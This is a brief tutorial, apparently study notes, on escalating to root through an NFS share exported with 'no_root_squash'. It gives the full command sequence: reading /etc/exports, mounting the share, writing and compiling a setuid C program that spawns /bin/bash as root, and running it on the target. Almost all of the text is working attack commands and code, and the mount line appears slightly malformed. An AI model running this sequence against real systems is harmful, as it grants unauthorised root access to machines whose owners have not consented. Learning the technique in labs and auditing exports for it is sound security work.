How to find root squashing?

```shell
cat /etc/exports
```

There you will see "no_root_squash"

If you find no root squash in a folder, that means that the folder is shareable and mountable. 

So how do we mount it?

```shell
showmount -e <ip_of_machine>
mkdir /tmp/mountme
mount -o rw,vers=2 <ip>: /tmp /tmp/mountme
```

Now that we have mounted, we can write our malicious C file on the mounted folder

```shell
echo 'int main() {setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/mountme/x.c
```

```shell
gcc /tmp/mountme/x.c -o /tmp/mountme/x
chmod +s /tmp/mountme/x
```

Then if we come back to the machine and go to the tmp folder and execute x, we get root.

